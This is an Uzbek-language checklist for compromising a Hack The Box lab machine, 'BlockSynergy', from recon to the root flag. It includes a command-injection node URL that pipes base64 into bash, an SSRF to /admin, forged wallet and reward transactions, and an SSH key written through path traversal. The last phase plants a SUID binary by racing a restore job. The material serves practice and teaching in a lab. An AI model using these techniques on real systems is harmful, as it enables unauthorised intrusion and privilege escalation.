# BlockSynergy — qo'lda ishlash rejasi (bosqichma-bosqich)

TARGET = 10.129.246.255   (o'zingizda HTB VPN ulangan bo'lishi shart)
Maqsad  = root flag (`/root/root.txt`)

## Faza 0 — Tayyorgarlik
- [ ] VPN tekshirish: `ip a | grep -i tun` -> tun0 ko'rinishi kerak
- [ ] `ping -c1 10.129.246.255`
- [ ] Ish papkasi: `mkdir -p ~/htb/blocksynergy && cd ~/htb/blocksynergy`
- [ ] `/etc/hosts` ga qo'shish: `10.129.246.255 blocksynergy.htb`
- [ ] Qo'lida: nmap, curl, python3, ssh, (pspy64 yuklab olish)

## Faza 1 — Recon  <-- HOZIR SHU
- [ ] To'liq port skan: `sudo nmap -sC -sV -p- -T4 --min-rate 2000 -oA nmap_full 10.129.246.255`
- [ ] 8080 xizmat skan: `nmap -sV -p8080 --script http-title,http-headers,http-enum 10.129.246.255`
- [ ] Sahifani ochish (browser yoki curl) -> `http://10.129.246.255:8080/`
- [ ] `/blockchain` JSON ni olish
- [ ] Endpointlarni yozib olish: /dashboard, /dashboard/wallet, /dashboard/vip/nodes, /admin
- [ ] MENDAN: nmap chiqishi + sahifa sarlavhasi + `/blockchain` ning boshi

## Faza 2 — Wallet -> VIP
- [ ] Wallet create (`action=create`, `filename=...`)
- [ ] Wallet load (`action=load`, maydon: `file`)  -> sessiya cookie saqlash (curl -c/-b)
- [ ] `/blockchain` dan eng boy public_key ni topish
- [ ] Soxta wallet: o'z private_key + o'sha public_key -> load -> "Wallet loaded successfully"
- [ ] Soxta reward TX: `sender=Blockchain_Reward`, `signature=Blockchain`, maydon `receiver`
- [ ] Mine (>=10 coin) -> VIP panel ochilishi
- [ ] MENDAN: wallet JSON, cookie, VIP panel screenshot/HTML

## Faza 3 — SSRF -> /admin
- [ ] `POST /dashboard/vip/nodes` (action=register, node=http://0.0.0.0:8080/admin)
- [ ] `GET /dashboard/vip/nodes/test_node/<ID>` -> admin dashboard ko'rinishi
- [ ] MENDAN: test_node javobi (HTML)

## Faza 4 — Command Injection -> walter
- [ ] Node URL: `http://x;echo <B64>|base64 -d|bash;a@0.0.0.0:8080/`
- [ ] Trigger: `http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<URL>`
      (register qilib, keyin test_node orqali)
- [ ] `id`, `hostname` tekshirish
- [ ] `/home/walter/user.txt`
- [ ] MENDAN: kim sifatida ishlayotgani + user.txt

## Faza 5 — walter -> hank (port 5000, path traversal)
- [ ] `ss -tlnp`, `curl -s http://127.0.0.1:5000/`
- [ ] Manba: `/opt/staging/smart_contracts/*.py`
- [ ] `ssh-keygen -t ed25519 -f hank_key -N ''`
- [ ] Zararli contract: `debug=True`, `__meta__.log_file=../../../../home/hank/.ssh/authorized_keys`
- [ ] Upload (`upload_contract`) + `contract_mint` (cookie continuity!)
- [ ] `ssh -i hank_key hank@10.129.246.255`
- [ ] MENDAN: 5000 sahifasi, contract upload javobi, ssh natijasi

## Faza 6 — hank -> root (TOCTOU race)
- [ ] pspy64 -> cron/backup/restore ko'rish
- [ ] `/opt/blocksynergy` ruxsatlari, `restore` fayli
- [ ] SUID tar yasash (`--transform opt/blocksynergy/.diag --mode=4755 --owner=0`)
- [ ] Race: watcher + `touch /opt/blocksynergy/restore`
- [ ] `/opt/blocksynergy/.diag -p` -> `cat /root/root.txt`
- [ ] MENDAN: root.txt (flag)

## Ehtiyot choralari
- Malformed TX yubormang (tx pool buziladi -> 500 lar)
- `recipient` emas, `receiver` ishlating
- `-p` siz SUID bash ishlamaydi
